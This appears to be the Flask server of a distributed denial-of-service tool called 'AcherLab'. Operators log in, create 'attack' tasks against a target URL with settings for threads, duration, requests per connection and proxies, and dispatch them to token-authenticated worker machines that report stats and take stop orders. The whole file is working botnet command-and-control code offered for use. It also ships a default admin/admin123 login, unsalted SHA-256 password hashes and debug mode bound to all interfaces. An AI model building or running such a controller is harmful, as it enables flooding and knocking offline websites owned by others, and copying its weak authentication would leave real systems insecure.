import os, json, time, threading, secrets, hashlib, hmac, uuid
from datetime import datetime
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", secrets.token_hex(32))

DATA_DIR = os.path.join(os.path.dirname(__file__), "data")
USERS_FILE = os.path.join(DATA_DIR, "users.json")
TASKS_FILE = os.path.join(DATA_DIR, "tasks.json")
WORKERS_FILE = os.path.join(DATA_DIR, "workers.json")
CONFIG_FILE = os.path.join(DATA_DIR, "config.json")
WORKER_TOKEN_FILE = os.path.join(DATA_DIR, "worker.json")

os.makedirs(DATA_DIR, exist_ok=True)

def hash_pw(pw):
    return hashlib.sha256(pw.encode()).hexdigest()

def init_data():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump({"admin": {"password": hash_pw("admin123"), "changed": False}}, f)
    if not os.path.exists(TASKS_FILE):
        with open(TASKS_FILE, "w") as f:
            json.dump({"tasks": [], "next_id": 1}, f)
    if not os.path.exists(WORKERS_FILE):
        with open(WORKERS_FILE, "w") as f:
            json.dump({}, f)
    worker_token = os.environ.get("WORKER_TOKEN") or secrets.token_hex(32)
    if not os.path.exists(WORKER_TOKEN_FILE):
        with open(WORKER_TOKEN_FILE, "w") as f:
            json.dump({"token": worker_token}, f)
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "w") as f:
            json.dump({"server_name": "AcherLab", "max_duration": 86400}, f)

def load_json(path):
    try:
        with open(path) as f:
            return json.load(f)
    except:
        return {}

def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2)

init_data()

def login_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        if not session.get("logged_in"):
            if request.path.startswith("/api/"):
                return jsonify({"error": "Not authenticated"}), 401
            return redirect("/login")
        users = load_json(USERS_FILE)
        username = session.get("username", "")
        if username not in users:
            session.clear()
            return redirect("/login")
        if not users[username].get("changed"):
            if request.path not in ("/change-password",):
                return redirect("/change-password")
        return f(*a, **kw)
    return wrapper

def worker_auth_required(f):
    @wraps(f)
    def wrapper(*a, **kw):
        token_data = load_json(WORKER_TOKEN_FILE)
        expected = token_data.get("token", "")
        auth = request.headers.get("Authorization", "")
        if not auth.startswith("Bearer ") or not hmac.compare_digest(auth[7:], expected):
            return jsonify({"error": "Unauthorized"}), 401
        worker_id = request.args.get("worker_id") or (request.json or {}).get("worker_id", "")
        if worker_id:
            workers = load_json(WORKERS_FILE)
            w = workers.setdefault(worker_id, {"online": True, "last_seen": None, "cpu_info": {}, "current_task": None, "stats": {}, "logs": [], "stop": False})
            w["online"] = True
            w["last_seen"] = datetime.now().isoformat()
            save_json(WORKERS_FILE, workers)
        kw["worker_id"] = worker_id
        return f(*a, **kw)
    return wrapper

@app.route("/")
@login_required
def index():
    return render_template("index.html")

@app.route("/login")
def login_page():
    if session.get("logged_in"):
        return redirect("/")
    return render_template("login.html")

@app.route("/change-password")
def change_pw_page():
    if not session.get("logged_in"):
        return redirect("/login")
    return render_template("change-password.html")

@app.route("/api/login", methods=["POST"])
def api_login():
    data = request.json
    username = data.get("username", "").strip()
    password = data.get("password", "").strip()
    users = load_json(USERS_FILE)
    if username not in users or users[username]["password"] != hash_pw(password):
        return jsonify({"error": "Invalid credentials"}), 401
    session["logged_in"] = True
    session["username"] = username
    session["pw_changed"] = users[username]["changed"]
    return jsonify({"message": "OK", "pw_changed": users[username]["changed"]})

@app.route("/api/change-password", methods=["POST"])
def api_change_password():
    if not session.get("logged_in"):
        return jsonify({"error": "Not logged in"}), 401
    data = request.json
    old = data.get("old_password", "")
    new = data.get("new_password", "")
    if len(new) < 4:
        return jsonify({"error": "Password must be at least 4 characters"}), 400
    username = session["username"]
    users = load_json(USERS_FILE)
    if users[username]["password"] != hash_pw(old):
        return jsonify({"error": "Current password is incorrect"}), 401
    users[username]["password"] = hash_pw(new)
    users[username]["changed"] = True
    save_json(USERS_FILE, users)
    session["pw_changed"] = True
    return jsonify({"message": "Password changed successfully"})

@app.route("/api/check-auth")
def api_check_auth():
    return jsonify({"logged_in": session.get("logged_in", False), "pw_changed": session.get("pw_changed", False)})

@app.route("/api/logout", methods=["POST"])
def api_logout():
    session.clear()
    return jsonify({"message": "Logged out"})

@app.route("/api/system")
@login_required
def api_system():
    workers_data = load_json(WORKERS_FILE)
    tasks_data = load_json(TASKS_FILE)
    now = datetime.now()
    workers = workers_data
    for wid, w in workers.items():
        if w.get("last_seen"):
            try:
                diff = (now - datetime.fromisoformat(w["last_seen"])).total_seconds()
                if diff > 15:
                    w["online"] = False
            except:
                pass
    return jsonify({
        "workers": workers,
        "tasks": tasks_data,
        "server_time": now.isoformat(),
    })

@app.route("/api/worker/ping")
@worker_auth_required
def api_worker_ping(*a, **kw):
    worker_id = kw.get("worker_id")
    if not worker_id:
        return jsonify({"error": "worker_id required"}), 400
    tasks_data = load_json(TASKS_FILE)
    tasks = tasks_data.get("tasks", [])
    my_task = None
    for t in tasks:
        if t.get("assigned_to") == worker_id and t.get("status") in ("pending",):
            my_task = dict(t)
            t["status"] = "running"
            t["started_at"] = datetime.now().isoformat()
            break
    if not my_task:
        for t in tasks:
            if t.get("status") == "pending" and t.get("assigned_to") is None:
                my_task = dict(t)
                t["status"] = "running"
                t["assigned_to"] = worker_id
                t["started_at"] = datetime.now().isoformat()
                break
    save_json(TASKS_FILE, tasks_data)
    return jsonify({"task": my_task, "worker_id": worker_id})

@app.route("/api/worker/stats", methods=["POST"])
@worker_auth_required
def api_worker_stats(*a, **kw):
    worker_id = kw.get("worker_id")
    if not worker_id:
        return jsonify({"error": "worker_id required"}), 400
    body = request.json or {}
    workers = load_json(WORKERS_FILE)
    w = workers.setdefault(worker_id, {})
    w["online"] = True
    w["last_seen"] = datetime.now().isoformat()
    w["cpu_info"] = body.get("cpu_info", w.get("cpu_info", {}))
    w["stats"] = body.get("stats", w.get("stats", {}))
    w["version"] = body.get("version", w.get("version"))
    if "logs" in body:
        existing = w.get("logs", [])
        existing.extend(body["logs"])
        w["logs"] = existing[-200:]
    if "current_task" in body:
        w["current_task"] = body["current_task"]
    save_json(WORKERS_FILE, workers)

    tasks_data = load_json(TASKS_FILE)
    for t in tasks_data.get("tasks", []):
        if t.get("assigned_to") == worker_id:
            t["stats"] = w.get("stats", {})
            if t.get("status") == "running" and body.get("logs"):
                t.setdefault("logs", []).extend(body["logs"])
                t["logs"] = t["logs"][-200:]
            if not w.get("stats", {}).get("running", False) and t.get("status") == "running":
                t["status"] = "completed"
    save_json(TASKS_FILE, tasks_data)

    workers = load_json(WORKERS_FILE)
    w2 = workers.get(worker_id, {})

    if not body.get("stats", {}).get("running", False):
        w2["stop"] = False
        workers[worker_id] = w2
        save_json(WORKERS_FILE, workers)

    return jsonify({"stop": w2.get("stop", False)})

@app.route("/api/attack/start", methods=["POST"])
@login_required
def api_attack_start():
    data = request.json or {}
    target = data.get("url", "").strip()
    if not target:
        return jsonify({"error": "Target URL required"}), 400
    tasks_data = load_json(TASKS_FILE)
    tasks = tasks_data.get("tasks", [])
    task_id = tasks_data.get("next_id", 1)
    tasks_data["next_id"] = task_id + 1
    worker_id = data.get("assign_to") or None
    task = {
        "id": task_id,
        "target": target,
        "method": data.get("method", "GET"),
        "threads": int(data.get("threads", 100)),
        "duration": int(data.get("duration", 60)),
        "proxy_type": int(data.get("proxy_type", 0)),
        "rpc": int(data.get("rpc", 10)),
        "assign_to": worker_id,
        "status": "pending",
        "created_at": datetime.now().isoformat(),
        "started_at": None,
        "assigned_to": worker_id,
        "logs": [],
        "stats": {},
    }
    tasks.append(task)
    tasks_data["tasks"] = tasks
    save_json(TASKS_FILE, tasks_data)
    return jsonify({"message": "Task created", "task": task})

@app.route("/api/attack/stop/<worker_id>", methods=["POST"])
@login_required
def api_attack_stop(worker_id):
    workers = load_json(WORKERS_FILE)
    if worker_id not in workers:
        return jsonify({"error": "Worker not found"}), 404
    workers[worker_id]["stop"] = True
    save_json(WORKERS_FILE, workers)

    tasks_data = load_json(TASKS_FILE)
    for t in tasks_data.get("tasks", []):
        if t.get("assigned_to") == worker_id and t.get("status") == "running":
            t["status"] = "stopped"
    save_json(TASKS_FILE, tasks_data)
    return jsonify({"message": f"Stop sent to {worker_id}"})

@app.route("/api/tasks", methods=["GET"])
@login_required
def api_tasks():
    tasks_data = load_json(TASKS_FILE)
    return jsonify(tasks_data)

@app.route("/api/workers", methods=["GET"])
@login_required
def api_workers():
    workers = load_json(WORKERS_FILE)
    now = datetime.now()
    for wid, w in workers.items():
        if w.get("last_seen"):
            try:
                diff = (now - datetime.fromisoformat(w["last_seen"])).total_seconds()
                if diff > 15:
                    w["online"] = False
            except:
                pass
    return jsonify(workers)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
